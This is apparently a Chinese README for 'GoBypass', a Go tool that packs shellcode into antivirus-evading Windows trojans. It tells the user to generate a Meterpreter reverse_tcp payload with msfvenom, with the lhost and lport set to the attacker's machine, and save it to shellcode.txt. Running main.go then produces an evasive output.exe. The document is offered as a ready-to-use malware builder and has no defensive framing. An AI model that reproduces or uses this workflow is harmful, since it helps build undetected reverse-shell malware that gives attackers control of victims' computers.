# GoBypass

### 介绍

`Golang`免杀马生成工具（该工具仅针对`Windows`系统）


### 准备工作

在`kali`中使用`msfvenom`生成需要的`payload`（注意使用`-f c`参数）

示例：`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c`

复制完整C语言格式的`shellcode`并写入当前目录的`shellcode.txt`

### 生成免杀马

使用命令：`go run main.go`即可在当前目录生成免杀马`output.exe`

注意：
1. 确保环境变量中有`go`否则无法编译
2. 如果报错请先执行`go env -w GO111MODULE=on`然后`go mod download`命令下载依赖
3. 如果下载依赖过慢配置镜像`go env -w GOPROXY=https://mirrors.aliyun.com/goproxy`